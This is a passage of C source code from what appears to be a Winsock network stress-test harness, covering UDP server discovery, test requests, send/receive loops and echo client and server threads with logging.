		MyLog(hLog, XLL_FAIL, "Couldn't bind search socket: %u", WSAGetLastError());
		goto EXIT;
    }

#endif

	// Continue sending search packets until we get a response from a server
	while(!fFoundServer)
	{
		pFindServPacket = (FINDSERV_PACKET *) PacketBuffer;
		pFindServPacket->dwPacketType = FINDSERV;
		
		DestinationAddress.sin_family = AF_INET;
		DestinationAddress.sin_port = htons(FIND_SERVER_PORT);
		DestinationAddress.sin_addr.s_addr = INADDR_BROADCAST;

		// Send the ping packet
		if(sendto(SearchSocket, (const char *) pFindServPacket, 1 * sizeof(DWORD), 0, (struct sockaddr *) &DestinationAddress, sizeof(DestinationAddress)) == SOCKET_ERROR)
		{
			MyLog(hLog, XLL_FAIL, "Couldn't send data: %u", WSAGetLastError());
			goto EXIT;
		}

//		MyLog(hLog, XLL_INFO, "Sent FINDSERV packet to server");

		// If read all incoming datagrams until we don't receive any for one second... then retransmit
		while(IsSocketReady(SearchSocket, READABLE, 1) && !fFoundServer)
		{
			
			// See how large the next available datagram is...
			if(ioctlsocket(SearchSocket, FIONREAD, &dwBytesAvailable))
			{
				MyLog(hLog, XLL_INFO, "Couldn't determine if bytes are available on socket");
				goto EXIT;
			}
			
			if(!dwBytesAvailable)
			{
				MyLog(hLog, XLL_WARN, "Possible error, select said socket was readable, but no data available");
				goto EXIT;
			}
			
			// If it's too large, truncate it
			if(dwBytesAvailable > MAX_PACKET_SIZE)
			{
				MyLog(hLog, XLL_INFO, "Received packet was too large: %u bytes", dwBytesAvailable);
				dwBytesAvailable = MAX_PACKET_SIZE;
			}
			
			pGenericPacket = (GENERIC_PACKET *) PacketBuffer;
			nAddressSize = sizeof(DestinationAddress);
			
			// Read the datagram
			if (recvfrom(SearchSocket, (char *) pGenericPacket, dwBytesAvailable, 0, (struct sockaddr *) &DestinationAddress, &nAddressSize) == SOCKET_ERROR)
			{	
				MyLog(hLog, XLL_FAIL, "Couldn't recv data: %u", WSAGetLastError());
				goto EXIT;				
			}
			
			// Determine what type of packet it is
			switch(pGenericPacket->dwPacketType)
			{
			case SERVREPLY:
//				MyLog(hLog, XLL_INFO, "Received SERVREPLY from server");
				if(!inet_ntoa(DestinationAddress.sin_addr))
				{
					MyLog(hLog, XLL_FAIL, "Couldn't convert server address to an IP string");
					continue;
				}
				strcpy(szDestinationAddress, inet_ntoa(DestinationAddress.sin_addr));
				MyLog(hLog, XLL_INFO, "Found server at %s", szDestinationAddress);
				fFoundServer = TRUE;
				break;
			case FINDSERV:
			case TESTREQUEST:
			case SENDRECV:
			case TESTREPLY:
				// Ignore these packets
				break;
			default:
				MyLog(hLog, XLL_INFO, "Received packet is of unknown type: %u", pGenericPacket->dwPacketType);
				goto EXIT;
			}

		}// while socket has incoming datagrams to read

	}// while the server hasn't been found

EXIT:

	if(SearchSocket != INVALID_SOCKET)
		closesocket(SearchSocket);

	return fFoundServer;
}

//==================================================================================
// RequestTest
//----------------------------------------------------------------------------------
//
// Description: Requests a test from the server
//
// Arguments:
//	HANDLE		hLog						Handle to the logging subsystem
//	TEST_CASE	TestCase					Test case being requested
//	CHAR		*szDestinationAddress		IP address of server
// Returns:
//	Returns TRUE if the activity has occured, FALSE otherwise
//==================================================================================
BOOL RequestTest(HANDLE hLog, TEST_CASE TestCase, CHAR *szDestinationAddress)
{
	TESTREQUEST_PACKET *pTestRequestPacket = NULL;
	TESTREPLY_PACKET *pTestReplyPacket = NULL;
	GENERIC_PACKET *pGenericPacket = NULL;
	SOCKADDR_IN DestinationAddress;
	SOCKET RequestSocket = INVALID_SOCKET;
	DWORD	dwBytesAvailable = 0, dwTestRequestID = 0;
	BOOL	fServerAckedRequest = FALSE;
	BYTE	PacketBuffer[MAX_PACKET_SIZE];

#ifdef _XBOX
	SOCKADDR_IN LocalAddress;
#endif

	BOOL	fReturn = FALSE, fEnableBroadcast = TRUE, fFoundServer = FALSE;
	INT		nAddressSize = 0;

	// Create the socket
    if((RequestSocket = socket(AF_INET, SOCK_DGRAM, 0)) == INVALID_SOCKET)
	{
		MyLog(hLog, XLL_FAIL, "Couldn't create DGRAM socket: %u", WSAGetLastError());
		goto EXIT;
	}

#ifdef _XBOX
// BUGBUG - this is a workaround for the fact that Xbox requires UDP sockets
//          to be explicitly bound before sending

	LocalAddress.sin_family = AF_INET;
    LocalAddress.sin_port = htons(FIND_SERVER_PORT);
    LocalAddress.sin_addr.s_addr = INADDR_ANY;

	// Bind the socket to the local address
    if (bind(RequestSocket, (const struct sockaddr *) &LocalAddress, sizeof(SOCKADDR_IN)) == SOCKET_ERROR)
    {
		MyLog(hLog, XLL_FAIL, "Couldn't bind search socket: %u", WSAGetLastError());
		goto EXIT;
    }

#endif

	dwTestRequestID = GetTickCount();

	// Continue sending test request packets until we get a responce from the server
	while(!fServerAckedRequest)
	{
		pTestRequestPacket = (TESTREQUEST_PACKET *) PacketBuffer;
		pTestRequestPacket->dwPacketType = TESTREQUEST;
		pTestRequestPacket->dwTestID = dwTestRequestID;
		pTestRequestPacket->TestRequested = TestCase;
		
		DestinationAddress.sin_family = AF_INET;
		DestinationAddress.sin_port = htons(FIND_SERVER_PORT);
		DestinationAddress.sin_addr.s_addr = inet_addr(szDestinationAddress);
		
		// Send the ping packet
		if(sendto(RequestSocket, (const char *) pTestRequestPacket, 3 * sizeof(DWORD), 0, (struct sockaddr *) &DestinationAddress, sizeof(DestinationAddress)) == SOCKET_ERROR)
		{
			MyLog(hLog, XLL_FAIL, "Couldn't send data: %u", WSAGetLastError());
			goto EXIT;
		}
		
//		MyLog(hLog, XLL_INFO, "Sent TESTREQUEST packet to server");
		
		// If read all incoming datagrams until we don't receive any for one second... then retransmit
		while(IsSocketReady(RequestSocket, READABLE, 1) && !fServerAckedRequest)
		{
			
			// See how large the next available datagram is...
			if(ioctlsocket(RequestSocket, FIONREAD, &dwBytesAvailable))
			{
				MyLog(hLog, XLL_FAIL, "Couldn't determine if bytes are available on socket");
				goto EXIT;
			}
			
			if(!dwBytesAvailable)
			{
				MyLog(hLog, XLL_WARN, "Possible bug: select returned that this socket is readable, but no data is waiting");
				continue;
			}
			
			// If it's too large, truncate it
			if(dwBytesAvailable > MAX_PACKET_SIZE)
			{
				MyLog(hLog, XLL_WARN, "Received packet was too large: %u bytes", dwBytesAvailable);
				dwBytesAvailable = MAX_PACKET_SIZE;
			}
			
			pGenericPacket = (GENERIC_PACKET *) PacketBuffer;
			nAddressSize = sizeof(DestinationAddress);
			
			// Read the datagram
			if (recvfrom(RequestSocket, (char *) pGenericPacket, dwBytesAvailable, 0, (struct sockaddr *) &DestinationAddress, &nAddressSize) == SOCKET_ERROR)
			{	
				MyLog(hLog, XLL_FAIL, "Couldn't recv data: %u", WSAGetLastError());
				goto EXIT;				
			}
			
			// Determine what type of packet it is
			switch(pGenericPacket->dwPacketType)
			{
			case TESTREPLY:
//				MyLog(hLog, XLL_INFO, "Received TESTREPLY from server");
				pTestReplyPacket = (TESTREPLY_PACKET *) PacketBuffer;
				
				if((pTestReplyPacket->dwTestID == dwTestRequestID) && (pTestReplyPacket->TestRequested == TestCase))
				{
//					MyLog(hLog, XLL_INFO, "Server acked test request");
					fServerAckedRequest = TRUE;
				}
				else
					MyLog(hLog, XLL_WARN, "Invalid test reply received: %u, %u",
					pTestReplyPacket->dwTestID, pTestReplyPacket->TestRequested);
				break;
			case FINDSERV:
			case TESTREQUEST:
			case SENDRECV:
			case SERVREPLY:
				// Ignore these packets
				break;
			default:
				MyLog(hLog, XLL_INFO, "Received packet is of unknown type: %u", pGenericPacket->dwPacketType);
				goto EXIT;
			}
			
		}// while socket has incoming datagrams to read
		
	}// while the server hasn't acked the test request
	
EXIT:
	if(RequestSocket != INVALID_SOCKET)
		closesocket(RequestSocket);

	return fServerAckedRequest;
}

//==================================================================================
// IsSocketReady
//----------------------------------------------------------------------------------
//
// Description: Creates a listening socket and accepts a connection
//
// Arguments:
//	SOCKET			Socket				Socket to monitor for a given state
//	SOCKET_STATE	SocketState			State to monitor for
// Returns:
//	Returns TRUE if the activity has occured, FALSE otherwise
//==================================================================================
BOOL IsSocketReady(SOCKET Socket, SOCKET_STATE SocketState, DWORD dwSecondsToWait)
{
	fd_set SocketCollection, *ReadCollection, *WriteCollection, *ExceptCollection;
	timeval TimeOut = {0,0}, *pTimeOut = NULL;

	// If we have a bad socket, just report FALSE
	if(Socket == INVALID_SOCKET)
		return FALSE;

	if(dwSecondsToWait != TIME_INFINITY)
	{
		TimeOut.tv_sec = dwSecondsToWait;
		pTimeOut = &TimeOut;
	}

	FD_ZERO(&SocketCollection);
	FD_SET(Socket, &SocketCollection);

	// Depending on the activity to monitor for, setup the parameters to select
	switch(SocketState)
	{
	case READABLE:
		ReadCollection = &SocketCollection;
		WriteCollection = NULL;
		ExceptCollection = NULL;
		break;
	case WRITEABLE:
		ReadCollection = NULL;
		WriteCollection = &SocketCollection;
		ExceptCollection = NULL;
		break;
	default:
		ReadCollection = NULL;
		WriteCollection = NULL;
		ExceptCollection = &SocketCollection;
		break;
	}

	if((select(1, ReadCollection, WriteCollection, ExceptCollection, pTimeOut)) != 1)
		return FALSE;
	else
		return TRUE;
}


//==================================================================================
// Tests
//==================================================================================

//==================================================================================
// DoSendTest
//----------------------------------------------------------------------------------
//
// Description:  Test which establishes a connection and begins a tight send loop.
//
// Arguments:
//	LPVOID			pParam		Pointer to structure containing test parameters
// Returns:
//	TRUE if successful, FALSE otherwise
//==================================================================================
DWORD WINAPI DoSendTest(LPVOID pParam)
{
	SENDRECV_PACKET	*pPacket;
	TEST_PARAMS *pTestParams = (TEST_PARAMS *) pParam;
	SOCKET	Connection;
	DWORD	dwStartTick, dwTotalBytesSent = 0, dwTotalPacketSize = 0, dwReturnValue = TRUE;
	BYTE	PacketBuffer[MAX_PACKET_SIZE + (4 * sizeof(DWORD))];
	INT		nBytesSent = 0;

	pPacket = (SENDRECV_PACKET *) PacketBuffer;
	pPacket->dwPacketNumber = 0;

	MyLog(pTestParams->hLog, XLL_INFO, "Running SendTest");

	// Establish the connection either by initiating one or waiting for an incoming one
	if(pTestParams->fInitiateConnection)
	{
		if(!pTestParams->szDestinationAddress)
		{
			MyLog(pTestParams->hLog, XLL_FAIL, "Cannot establish a connection without a destination address!");
			dwReturnValue = FALSE;
			goto EXIT;
		}

		Connection = EstablishConnection(pTestParams->hLog, pTestParams->szDestinationAddress, pTestParams->fNonBlocking);
	}
	else
		Connection = WaitForIncomingConnection(pTestParams->hLog, pTestParams->fNonBlocking);

	// Get the start time of the test
	dwStartTick = GetTickCount();

	// While the test hasn't reached it's end-time, send data
	while(!IsTimeExpired(pTestParams->dwSecondsToRun, dwStartTick))
	{
		// Create all the packet header fields and build the payload data
		pPacket->dwPacketType = SENDRECV;
		++(pPacket->dwPacketNumber);
		pPacket->dwPayloadSize = RandomRange(1, MAX_PACKET_SIZE);
		pPacket->dwPayloadChecksum = BuildTestPacket(pPacket->dwPayloadSize, (BYTE *) pPacket->bPayload);

		dwTotalPacketSize = pPacket->dwPayloadSize + (4 * sizeof(DWORD));

		// Loop until we send all the data from this packet
		for(dwTotalBytesSent = 0; dwTotalBytesSent < dwTotalPacketSize; dwTotalBytesSent += (DWORD) nBytesSent)
		{
			nBytesSent = 0;
			
			if ((nBytesSent = send(Connection, (char *) pPacket + dwTotalBytesSent, dwTotalPacketSize - dwTotalBytesSent, 0)) == SOCKET_ERROR)
			{
				// If we are non-blocking and we would have blocked... wait for writeability
				if(pTestParams->fNonBlocking && (WSAGetLastError() == WSAEWOULDBLOCK))
				{
					while(!IsSocketReady(Connection, WRITEABLE, 10))
					{
						MyLog(pTestParams->hLog, XLL_INFO, "Waiting for socket to become writeable");
					}

					// We didn't send any bytes, the operation was just returning an error
					nBytesSent = 0;
					continue;
				}

				MyLog(pTestParams->hLog, XLL_FAIL, "Couldn't send data: %u", WSAGetLastError());
				dwReturnValue = FALSE;
				goto EXIT;				
			}
			
		}	
		
	} // Test has reached it's end-time

EXIT:

	// Clean up the test socket, we don't need it anymore
	if(Connection != INVALID_SOCKET)
	{
		closesocket(Connection);
		Connection = INVALID_SOCKET;
	}

	pTestParams->fCleanUpAfterTest ? LocalFree(pTestParams) : 0;

	if(dwReturnValue)
		MyLog(pTestParams->hLog, XLL_PASS, "SendTest passed");
	else
		MyLog(pTestParams->hLog, XLL_FAIL, "SendTest failed");

	return dwReturnValue;
}

//==================================================================================
// DoRecvTest
//----------------------------------------------------------------------------------
//
// Description: Test which establishes a connection and begins a tight recv loop with delays.
//
// Arguments:
//	LPVOID			pParams		Pointer to structure containing test parameters
// Returns:
//	TRUE if successful, FALSE otherwise
//==================================================================================
DWORD WINAPI DoRecvTest(LPVOID pParam)
{
	SENDRECV_PACKET	*pPacket;
	TEST_PARAMS *pTestParams = (TEST_PARAMS *) pParam;
	SOCKET	Connection;
	DWORD	dwStartTick, dwTotalBytesRead = 0, dwCheckSum = 0, dwNextDelay = 0, dwNextDelaySize = 0, dwReturnValue = TRUE;
	BYTE	PacketBuffer[MAX_PACKET_SIZE + (4 * sizeof(DWORD))];
	INT		nBytesRead = 0;

	pPacket = (SENDRECV_PACKET *) PacketBuffer;
	pPacket->dwPacketNumber = 0;

	MyLog(pTestParams->hLog, XLL_INFO, "Running RecvTest");

	// Establish the connection either by initiating one or waiting for an incoming one
	if(pTestParams->fInitiateConnection)
	{
		if(!pTestParams->szDestinationAddress)
		{
			MyLog(pTestParams->hLog, XLL_FAIL, "Cannot establish a connection without a destination address!");
			dwReturnValue = FALSE;
			goto EXIT;
		}

		Connection = EstablishConnection(pTestParams->hLog, pTestParams->szDestinationAddress, pTestParams->fNonBlocking);
	}
	else
		Connection = WaitForIncomingConnection(pTestParams->hLog, pTestParams->fNonBlocking);

	// Get the start time of the test
	dwStartTick = GetTickCount();

	// If we are using delays, calculate when the next delay should take place and how long it should last
	if(pTestParams->fUseDelays)
	{
		dwNextDelay = RandomRange(1, 50);
		dwNextDelaySize = RandomRange(1, 5000);
	}

	// While the test hasn't reached it's end-time, send data
	while(!IsTimeExpired(pTestParams->dwSecondsToRun, dwStartTick))
	{
		// If we are using delays, do delay processing
		if(pTestParams->fUseDelays)
		{
			if(!dwNextDelay)
			{
				Sleep(dwNextDelaySize);
				dwNextDelay = RandomRange(1, 100);
				dwNextDelaySize = RandomRange(1, 1000);
			}
			
			--dwNextDelay;
		}
		
		// Loop until we recv all the data from this packet's header
		for(dwTotalBytesRead = 0; dwTotalBytesRead < (4 * sizeof(DWORD)); dwTotalBytesRead += (DWORD) nBytesRead)
		{
			if ((nBytesRead = recv(Connection, (char *) pPacket + dwTotalBytesRead, (4 * sizeof(DWORD)) - dwTotalBytesRead, 0)) == SOCKET_ERROR)
			{
				// If we are non-blocking and we would have blocked... wait for readability
				if(pTestParams->fNonBlocking && (WSAGetLastError() == WSAEWOULDBLOCK))
				{
					while(!IsSocketReady(Connection, READABLE, 10))
					{
						MyLog(pTestParams->hLog, XLL_INFO, "Waiting for socket to become readable");
					}

					// No bytes were read, the operation was just reporting that it would have blocked
					nBytesRead = 0;
					continue;
				}

				MyLog(pTestParams->hLog, XLL_FAIL, "Couldn't recv data: %u", WSAGetLastError());
				dwReturnValue = FALSE;
				goto EXIT;				
			}

		}

		// If this isn't a send-recv packet, then something is wrong
		if(pPacket->dwPacketType != SENDRECV)
			MyLog(pTestParams->hLog, XLL_WARN, "Received packet is of wrong type: %u", pPacket->dwPacketType);

		// If the packet is too big, truncate it
		if(pPacket->dwPayloadSize > MAX_PACKET_SIZE)
		{
			MyLog(pTestParams->hLog, XLL_WARN, "Received packet size is too large, truncating.");
			pPacket->dwPayloadSize = MAX_PACKET_SIZE;
		}

		// Loop until we recv all the data from this packet's payload
		for(dwTotalBytesRead = 0; dwTotalBytesRead < pPacket->dwPayloadSize; dwTotalBytesRead += (DWORD) nBytesRead)
		{
			nBytesRead = 0;
			
			if ((nBytesRead = recv(Connection, (char *) pPacket->bPayload + dwTotalBytesRead, pPacket->dwPayloadSize - dwTotalBytesRead, 0)) == SOCKET_ERROR)
			{
				// If we are non-blocking and we would have blocked... wait for readability
				if(pTestParams->fNonBlocking && (WSAGetLastError() == WSAEWOULDBLOCK))
				{
					while(!IsSocketReady(Connection, READABLE, 10))
					{
						MyLog(pTestParams->hLog, XLL_INFO, "Waiting for socket to become readable");
					}
					// No bytes were read, the operation was just reporting that it would have blocked
					nBytesRead = 0;
					continue;
				}

				MyLog(pTestParams->hLog, XLL_FAIL, "Couldn't recv data: %u", WSAGetLastError());
				dwReturnValue = FALSE;
				goto EXIT;				
			}	
		}


		dwCheckSum = CalculateCheckSum(pPacket->dwPayloadSize, (BYTE *) pPacket->bPayload);

		if(dwCheckSum != pPacket->dwPayloadChecksum)
			MyLog(pTestParams->hLog, XLL_WARN, "Received packet %u checksum failed: %u",
			pPacket->dwPacketNumber, dwCheckSum);

	} // Test has reached it's end-time

EXIT:

	// Clean up the test socket, we don't need it anymore
	if(Connection != INVALID_SOCKET)
	{
		closesocket(Connection);
		Connection = INVALID_SOCKET;
	}

	pTestParams->fCleanUpAfterTest ? LocalFree(pTestParams) : 0;

	if(dwReturnValue)
		MyLog(pTestParams->hLog, XLL_PASS, "RecvTest passed");
	else
		MyLog(pTestParams->hLog, XLL_FAIL, "RecvTest failed");

	return dwReturnValue;

}

//==================================================================================
// SendRecvCountThread
//----------------------------------------------------------------------------------
//
// Description: Thread that periodically prints total number of send and recv calls
//
// Arguments:
//	LPVOID		*pParam				Pointer to the ECHO_CLIENT_PARAM structure for this thread
// Returns:
//	always 0
//==================================================================================
DWORD WINAPI ServerEchoCountThread(LPVOID *pParam)
{
	ECHO_SERVER_PARAM	*pEchoServerParam = (ECHO_SERVER_PARAM *) pParam;

	// While the test hasn't reached it's end-time, print send/recv totals
	while(pEchoServerParam->fTestActive)
	{
		Sleep(2000);
		MyLog(pEchoServerParam->hLog, XLL_INFO, "CountThread: %u echos, %s, %s",
			pEchoServerParam->dwTotalEchos,
			pEchoServerParam->fInSend ? "InSend" : "NotInSend",
			pEchoServerParam->fInRecv ? "InRecv" : "NotInRecv");
	}

	return 0;
}

//==================================================================================
// DoSingleThreadEchoServerTest
//----------------------------------------------------------------------------------
//
// Description: Test which establishes a connection and echos packets it receives in a single thread
//
// Arguments:
//	LPVOID			pParams		Pointer to structure containing test parameters
// Returns:
//	TRUE if successful, FALSE otherwise
//==================================================================================
DWORD WINAPI DoSingleThreadEchoServerTest(LPVOID pParam)
{
	ECHO_SERVER_PARAM EchoServerParam;
	TEST_PARAMS *pTestParams = (TEST_PARAMS *) pParam;
	SENDRECV_PACKET	*pPacket;
	HANDLE	hCountThread = INVALID_HANDLE_VALUE;
	SOCKET	Connection;
	DWORD	dwStartTick, dwTotalBytesRead = 0, dwCheckSum = 0, dwTotalBytesSent = 0, dwTotalPacketSize = 0, dwReturnValue = TRUE;
	BYTE	PacketBuffer[MAX_PACKET_SIZE + (4 * sizeof(DWORD))];
	INT		nBytesRead = 0, nBytesSent = 0;

	pPacket = (SENDRECV_PACKET *) PacketBuffer;
	pPacket->dwPacketNumber = 0;

	MyLog(pTestParams->hLog, XLL_INFO, "Running SingleThreadEchoServerTest");

	// Establish the connection either by initiating one or waiting for an incoming one
	if(pTestParams->fInitiateConnection)
	{
		if(!pTestParams->szDestinationAddress)
		{
			MyLog(pTestParams->hLog, XLL_FAIL, "Cannot establish a connection without a destination address!");
			dwReturnValue = FALSE;
			goto EXIT;
		}

		Connection = EstablishConnection(pTestParams->hLog, pTestParams->szDestinationAddress, FALSE);
	}
	else
		Connection = WaitForIncomingConnection(pTestParams->hLog, FALSE);

	// Start counting send's from zero
	EchoServerParam.dwTotalEchos = 0;
	EchoServerParam.fInSend = FALSE;
	EchoServerParam.fInRecv = FALSE;
	EchoServerParam.fTestActive = TRUE;
	EchoServerParam.hLog = pTestParams->hLog;

	// Spawn the count thread
//	if((hCountThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE) ServerEchoCountThread, (LPVOID) &EchoServerParam, 0, NULL)) == NULL)
//	{
//		MyLog(pTestParams->hLog, XLL_WARN, "Couldn't create thread: %u", GetLastError());
//		goto EXIT;
//	}

	// Get the start time of the test
	dwStartTick = GetTickCount();

	// While the test hasn't reached it's end-time, send data
	while(!IsTimeExpired(pTestParams->dwSecondsToRun, dwStartTick))
	{
		// Loop until we recv all the data from this packet's header
		for(dwTotalBytesRead = 0; dwTotalBytesRead < (4 * sizeof(DWORD)); dwTotalBytesRead += (DWORD) nBytesRead)
		{
			EchoServerParam.fInRecv = TRUE;
			if ((nBytesRead = recv(Connection, (char *) pPacket + dwTotalBytesRead, (4 * sizeof(DWORD)) - dwTotalBytesRead, 0)) == SOCKET_ERROR)
			{
				EchoServerParam.fInRecv = FALSE;

				MyLog(pTestParams->hLog, XLL_FAIL, "Couldn't recv data: %u", WSAGetLastError());
				dwReturnValue = FALSE;
				goto EXIT;				
			}
			EchoServerParam.fInRecv = FALSE;
		}

		// If this isn't a send-recv packet, then something is wrong
		if(pPacket->dwPacketType != SENDRECV)
			MyLog(pTestParams->hLog, XLL_WARN, "Received packet is of wrong type: %u", pPacket->dwPacketType);
		
		// If the packet is too big, truncate it
		if(pPacket->dwPayloadSize > MAX_PACKET_SIZE)
		{
			// The test is probably screwed at this point
			MyLog(pTestParams->hLog, XLL_WARN, "Received packet size is too large, truncating.");
			pPacket->dwPayloadSize = MAX_PACKET_SIZE;
		}

		// Loop until we recv all the data from this packet's payload
		for(dwTotalBytesRead = 0; dwTotalBytesRead < pPacket->dwPayloadSize; dwTotalBytesRead += (DWORD) nBytesRead)
		{
			nBytesRead = 0;
			
			EchoServerParam.fInRecv = TRUE;
			if ((nBytesRead = recv(Connection, (char *) pPacket->bPayload + dwTotalBytesRead, pPacket->dwPayloadSize - dwTotalBytesRead, 0)) == SOCKET_ERROR)
			{
				EchoServerParam.fInRecv = FALSE;

				MyLog(pTestParams->hLog, XLL_FAIL, "Couldn't recv data: %u", WSAGetLastError());
				dwReturnValue = FALSE;
				goto EXIT;				
			}	
			EchoServerParam.fInRecv = FALSE;
		}

		// Check to see if the packe was corrupted
		dwCheckSum = CalculateCheckSum(pPacket->dwPayloadSize, (BYTE *) pPacket->bPayload);
		if(dwCheckSum != pPacket->dwPayloadChecksum)
			MyLog(pTestParams->hLog, XLL_WARN, "Received packet %u checksum failed: %u",
			pPacket->dwPacketNumber, dwCheckSum);

		dwTotalPacketSize = pPacket->dwPayloadSize + (4 * sizeof(DWORD));

		// Loop until we send all the data from this packet
		for(dwTotalBytesSent = 0; dwTotalBytesSent < dwTotalPacketSize; dwTotalBytesSent += (DWORD) nBytesSent)
		{
			nBytesSent = 0;
			
			EchoServerParam.fInSend = TRUE;
			if ((nBytesSent = send(Connection, (char *) pPacket + dwTotalBytesSent, dwTotalPacketSize - dwTotalBytesSent, 0)) == SOCKET_ERROR)
			{
				EchoServerParam.fInSend = FALSE;

				MyLog(pTestParams->hLog, XLL_FAIL, "Couldn't send data: %u", WSAGetLastError());
				dwReturnValue = FALSE;
				goto EXIT;				
			}
			EchoServerParam.fInSend = FALSE;
			
		}	

		++EchoServerParam.dwTotalEchos;

	} // Test has reached it's end-time

	EchoServerParam.fTestActive = FALSE;

	WaitForSingleObject(hCountThread, INFINITE);

EXIT:

	if(hCountThread != INVALID_HANDLE_VALUE)
	{
		CloseHandle(hCountThread);
		hCountThread = INVALID_HANDLE_VALUE;
	}

	// Clean up the test socket, we don't need it anymore
	if(Connection != INVALID_SOCKET)
	{
		closesocket(Connection);
		Connection = INVALID_SOCKET;
	}

	pTestParams->fCleanUpAfterTest ? LocalFree(pTestParams) : 0;

	if(dwReturnValue)
		MyLog(pTestParams->hLog, XLL_PASS, "SingleThreadEchoServerTest passed");
	else
		MyLog(pTestParams->hLog, XLL_FAIL, "SingleThreadEchoServerTest failed");

	return dwReturnValue;

}

//==================================================================================
// SendRecvCountThread
//----------------------------------------------------------------------------------
//
// Description: Thread that periodically prints total number of send and recv calls
//
// Arguments:
//	LPVOID		*pParam				Pointer to the ECHO_CLIENT_PARAM structure for this thread
// Returns:
//	always 0
//==================================================================================
DWORD WINAPI SendRecvCountThread(LPVOID *pParam)
{
	ECHO_CLIENT_PARAM	*pEchoClientParam = (ECHO_CLIENT_PARAM *) pParam;

	// While the test hasn't reached it's end-time, print send/recv totals
	while(pEchoClientParam->fTestActive)
	{
		Sleep(2000);
		MyLog(pEchoClientParam->pTestParams->hLog, XLL_INFO, "CountThread: %u Sends, %u Recvs, %s, %s",
			pEchoClientParam->dwTotalSends,
			pEchoClientParam->dwTotalRecvs,
			pEchoClientParam->fInSend ? "InSend" : "NotInSend",
			pEchoClientParam->fInRecv ? "InRecv" : "NotInRecv");
	}

	return 0;
}

//==================================================================================
// EchoClientRecvThread
//----------------------------------------------------------------------------------
//
// Description: Thread that receives echoed packets from the echo server
//
// Arguments:
//	LPVOID		*pParam				Pointer to the ECHO_CLIENT_PARAM structure for this thread
// Returns:
//	always 0
//==================================================================================
DWORD WINAPI EchoClientRecvThread(LPVOID *pParam)
{
	ECHO_CLIENT_PARAM	*pEchoClientParam = (ECHO_CLIENT_PARAM *) pParam;
	SENDRECV_PACKET	*pPacket;
	DWORD	dwTotalBytesRead = 0, dwCheckSum = 0, dwNextDelay = 0, dwNextDelaySize = 0;
	BYTE	PacketBuffer[MAX_PACKET_SIZE + (4 * sizeof(DWORD))];
	INT		nBytesRead = 0;

	pPacket = (SENDRECV_PACKET *) PacketBuffer;
	pPacket->dwPacketNumber = 0;

	MyLog(pEchoClientParam->pTestParams->hLog, XLL_INFO, "EchoClientRecvThread running");

	// If we are using delays, calculate when the next delay should take place and how long it should last
	if(pEchoClientParam->pTestParams->fUseDelays)
	{
		dwNextDelay = RandomRange(1, 100);
		dwNextDelaySize = RandomRange(1, 1000);
	}

	// Start counting recv's from zero
	pEchoClientParam->dwTotalRecvs = 0;

	// While the test hasn't reached it's end-time, recv data
	while(pEchoClientParam->fTestActive)
	{
		// If we are using delays, do delay processing
		if(pEchoClientParam->pTestParams->fUseDelays)
		{
			if(!dwNextDelay)
			{
				Sleep(dwNextDelaySize);
				dwNextDelay = RandomRange(1, 100);
				dwNextDelaySize = RandomRange(1, 1000);
			}
			
			--dwNextDelay;
		}
		
		// Loop until we recv all the data from this packet's header
		for(dwTotalBytesRead = 0; dwTotalBytesRead < (4 * sizeof(DWORD)); dwTotalBytesRead += (DWORD) nBytesRead)
		{
			// If we are using critical sections, lock the socket
			if(pEchoClientParam->pTestParams->fUseCriticalSection)
				EnterCriticalSection(&(pEchoClientParam->SocketCriticalSection));
			// Otherwise, wait until the socket is marked as readable so we don't block in recv for too long
			else
			{
				while(!IsSocketReady(pEchoClientParam->Connection, READABLE, 10))
				{
					MyLog(pEchoClientParam->pTestParams->hLog, XLL_INFO, "Waiting for socket to become readable");
				}
			}

			pEchoClientParam->fInRecv = TRUE;

			if ((nBytesRead = recv(pEchoClientParam->Connection, (char *) pPacket + dwTotalBytesRead, (4 * sizeof(DWORD)) - dwTotalBytesRead, 0)) == SOCKET_ERROR)
			{
				pEchoClientParam->fInRecv = FALSE;

				// Unlock the socket
				pEchoClientParam->pTestParams->fUseCriticalSection ? LeaveCriticalSection(&(pEchoClientParam->SocketCriticalSection)) : 0;

				// If we are non-blocking and we would have blocked... wait for readability
				if(pEchoClientParam->pTestParams->fNonBlocking && (WSAGetLastError() == WSAEWOULDBLOCK))
				{
					while(!IsSocketReady(pEchoClientParam->Connection, READABLE, 10))
					{
						MyLog(pEchoClientParam->pTestParams->hLog, XLL_INFO, "Waiting for socket to become readable");
					}
					// No bytes were read, the operation was just reporting that it would have blocked
					nBytesRead = 0;
					continue;
				}

				if((WSAGetLastError() == WSAEINPROGRESS) && !pEchoClientParam->pTestParams->fUseCriticalSection)
				{
					++pEchoClientParam->dwInProgressOnRecvs;
					Sleep(500);
					continue;
				}

				MyLog(pEchoClientParam->pTestParams->hLog, XLL_FAIL, "Couldn't recv data: %u", WSAGetLastError());
				goto EXIT;				
			}

			pEchoClientParam->fInRecv = FALSE;
			++pEchoClientParam->dwTotalRecvs;

			// Unlock the socket
			pEchoClientParam->pTestParams->fUseCriticalSection ? LeaveCriticalSection(&(pEchoClientParam->SocketCriticalSection)) : 0;
		}

		// If this isn't a send-recv packet, then something is wrong
		if(pPacket->dwPacketType != SENDRECV)
			MyLog(pEchoClientParam->pTestParams->hLog, XLL_WARN, "Received packet is of wrong type: %u", pPacket->dwPacketType);

		// If the packet is too big, truncate it
		if(pPacket->dwPayloadSize > MAX_PACKET_SIZE)
		{
			MyLog(pEchoClientParam->pTestParams->hLog, XLL_WARN, "Received packet size is too large, truncating.");
			pPacket->dwPayloadSize = MAX_PACKET_SIZE;
		}

		// Loop until we recv all the data from this packet's payload
		for(dwTotalBytesRead = 0; dwTotalBytesRead < pPacket->dwPayloadSize; dwTotalBytesRead += (DWORD) nBytesRead)
		{
			nBytesRead = 0;
			
			// If we are using critical sections, lock the socket
			if(pEchoClientParam->pTestParams->fUseCriticalSection)
				EnterCriticalSection(&(pEchoClientParam->SocketCriticalSection));
			// Otherwise, wait until the socket is marked as readable so we don't block in recv for too long
			else
				while(!IsSocketReady(pEchoClientParam->Connection, READABLE, 10));
				{
					MyLog(pEchoClientParam->pTestParams->hLog, XLL_INFO, "Waiting for socket to become readable");
				}

			pEchoClientParam->fInRecv = TRUE;

			if ((nBytesRead = recv(pEchoClientParam->Connection, (char *) pPacket->bPayload + dwTotalBytesRead, pPacket->dwPayloadSize - dwTotalBytesRead, 0)) == SOCKET_ERROR)
			{
				pEchoClientParam->fInRecv = FALSE;

				// Unlock the socket
